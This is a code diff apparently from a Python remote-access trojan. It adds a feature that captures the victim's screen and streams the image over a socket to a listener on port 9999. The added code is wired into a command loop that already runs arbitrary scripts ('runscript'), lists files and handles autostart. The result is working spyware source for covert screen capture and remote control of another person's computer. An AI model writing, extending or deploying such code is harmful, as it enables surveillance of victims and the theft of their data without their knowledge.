@@ -36,15 +36,29 @@ def Receive(sock, end="[ENDOFMESSAGE]"):
     return data[:-len(end)].decode('utf-8')
 
 def ScreenCast():
-    try:
-        ImageGrab.grab().save(os.path.join(tmpFolder, "tmp.jpg"), "JPEG")
-        Send(s, open(os.path.join(tmpFolder, "tmp.jpg"), 'rb').read())
-    except:
-        pass
-    try:
-        os.remove(os.path.join(tmpFolder, "tmp.jpg"))
-    except:
-        pass
+    print 'aq'
+    ImageGrab.grab().save(os.path.join(tmpFolder, "tmp.jpg"), "JPEG")
+    sc = socket.socket()
+    sc.settimeout(None)
+    print 'done initializing'
+    while 1:
+        try:
+            sc.connect(("localhost",9999))
+            print 'connected'
+            f=open (os.path.join(tmpFolder, "tmp.jpg"), "rb")
+            l = f.read(1024)
+            while (l):
+                sc.send(l)
+                l = f.read(1024)
+            sc.close()
+            f.close()
+            os.remove(os.path.join(tmpFolder, "tmp.jpg"))
+            print 'done'
+            break
+        except Exception as e:
+            print e
+            continue
+
 
 
 def Execute(source):
@@ -116,6 +130,9 @@ def fromAutostart():
                         stdoutput = ''
                     elif data.startswith("runscript"):
                         stdoutput = Execute(data[10:])
+                    elif data.startswith('startScreenCasting'):
+                        ScreenCast()
+                        stdoutput = 'started'
                     elif data.startswith("ls"):
                         string = {}
                         try:
